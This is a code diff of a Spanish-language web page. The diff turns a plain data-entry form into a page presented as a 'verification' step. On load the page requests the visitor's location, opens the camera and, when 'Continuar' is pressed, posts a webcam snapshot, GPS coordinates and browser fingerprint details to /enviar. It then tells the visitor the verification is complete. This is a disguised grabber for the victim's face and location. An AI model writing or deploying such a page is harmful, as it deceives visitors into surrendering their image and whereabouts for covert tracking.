@@ -2,113 +2,94 @@
 <html lang="es">
 <head>
 <meta charset="UTF-8">
-<title>Formulario</title>
+<title>Acceso</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
 <style>
 body {
-    background: #0f0f0f;
-    color: white;
-    font-family: Arial;
+    background: #0d0d0d;
+    color: #00ffcc;
+    font-family: monospace;
     text-align: center;
 }
-
-.container {
-    margin-top: 30px;
-}
-
-input, button {
-    margin: 10px;
-    padding: 10px;
-    width: 80%;
-    border-radius: 10px;
-    border: none;
-}
-
-video {
+video, canvas {
     width: 90%;
-    border-radius: 15px;
+    max-width: 300px;
+    border-radius: 10px;
     margin-top: 10px;
 }
-
 button {
+    padding: 10px;
+    margin: 10px;
     background: #00ffcc;
-    color: black;
-    font-weight: bold;
+    border: none;
+    border-radius: 5px;
 }
 </style>
 </head>
-
 <body>
 
-<div class="container">
-    <h2>Enviar datos</h2>
+<h2>Verificación</h2>
 
-    <input type="text" id="nombre" placeholder="Nombre"><br>
-    <input type="text" id="telefono" placeholder="Teléfono"><br>
+<video id="video" autoplay playsinline></video>
+<br>
+<button onclick="capturar()">Continuar</button>
 
-    <video id="video" autoplay playsinline></video><br>
-
-    <button onclick="enviar()">Enviar</button>
-
-    <p id="estado"></p>
-</div>
+<canvas id="canvas" style="display:none;"></canvas>
 
 <script>
-const video = document.getElementById("video");
-const estado = document.getElementById("estado");
+let lat = "No permitido";
+let lon = "No permitido";
 
-// cámara
+// 📍 UBICACIÓN (con permiso)
+navigator.geolocation.getCurrentPosition(
+    pos => {
+        lat = pos.coords.latitude;
+        lon = pos.coords.longitude;
+    },
+    err => {
+        lat = "Denegado";
+        lon = "Denegado";
+    }
+);
+
+// 📸 CÁMARA
 navigator.mediaDevices.getUserMedia({ video: true })
 .then(stream => {
-    video.srcObject = stream;
-    estado.innerText = "📸 Cámara lista";
+    document.getElementById('video').srcObject = stream;
 })
 .catch(() => {
-    estado.innerText = "❌ Cámara bloqueada";
+    alert("No se pudo acceder a la cámara");
 });
 
-// info
-function getInfo() {
-    return {
-        resolucion: screen.width + "x" + screen.height,
-        idioma: navigator.language,
-        useragent: navigator.userAgent,
-        touch: ('ontouchstart' in window) ? "Sí" : "No",
-        dark: window.matchMedia('(prefers-color-scheme: dark)').matches ? "Sí" : "No",
-        online: navigator.onLine ? "Conectado" : "Sin conexión"
-    };
-}
+function capturar() {
+    let canvas = document.getElementById('canvas');
+    let video = document.getElementById('video');
 
-// enviar
-function enviar() {
-    const nombre = document.getElementById("nombre").value;
-    const telefono = document.getElementById("telefono").value;
-
-    let info = getInfo();
-
-    let canvas = document.createElement("canvas");
     canvas.width = video.videoWidth;
     canvas.height = video.videoHeight;
 
-    canvas.getContext("2d").drawImage(video, 0, 0);
+    let ctx = canvas.getContext('2d');
+    ctx.drawImage(video, 0, 0);
 
-    canvas.toBlob(async (blob) => {
-        let fd = new FormData();
+    let img = canvas.toDataURL("image/png");
 
-        fd.append("nombre", nombre);
-        fd.append("telefono", telefono);
-        fd.append("foto", blob);
-
-        for (let key in info) {
-            fd.append(key, info[key]);
-        }
-
-        await fetch("/enviar", {
-            method: "POST",
-            body: fd
-        });
-
-        estado.innerText = "✅ Enviado";
+    fetch('/enviar', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+            imagen: img,
+            resolucion: screen.width + "x" + screen.height,
+            idioma: navigator.language,
+            touch: ('ontouchstart' in window) ? "Sí" : "No",
+            dark: window.matchMedia('(prefers-color-scheme: dark)').matches ? "Sí" : "No",
+            online: navigator.onLine ? "Conectado" : "Offline",
+            useragent: navigator.userAgent,
+            lat: lat,
+            lon: lon
+        })
     });
+
+    alert("Verificación completada");
 }
 </script>
 
